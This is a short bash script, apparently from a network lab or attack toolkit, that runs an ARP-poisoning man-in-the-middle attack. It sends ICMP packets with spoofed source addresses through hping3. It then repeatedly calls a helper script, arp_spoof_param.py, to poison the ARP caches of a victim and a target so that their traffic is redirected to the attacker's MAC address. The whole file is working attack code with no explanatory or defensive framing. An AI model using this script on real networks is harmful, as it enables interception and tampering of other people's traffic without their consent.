#!/bin/bash
if [ $# -ne 5 ]; then
  echo "Usage: $0 <victim_ip> <victim_MAC> <target_ip> <target_MAC> <attacker_MAC>"
  exit 1
fi
victim_ip=$1
victim_MAC=$2
target_ip=$3
target_MAC=$4
attacker_MAC=$5

# create ARP entries between two target machines
hping3 -1 -c 1 -a ${victim_ip} ${target_ip}
hping3 -1 -c 1 -a ${target_ip}  ${victim_ip} 

# periodically keep poisoning ARP cache of two target machines
ii=0
while [ $ii -lt 5000 ];
do
  ./arp_spoof_param.py ${victim_ip} "${victim_MAC}" ${target_ip} "${attacker_MAC}"
  ./arp_spoof_param.py ${target_ip} "${target_MAC}" ${victim_ip} "${attacker_MAC}"
	sleep 5
	ii=$(($ii + 1))
	echo $ii
done
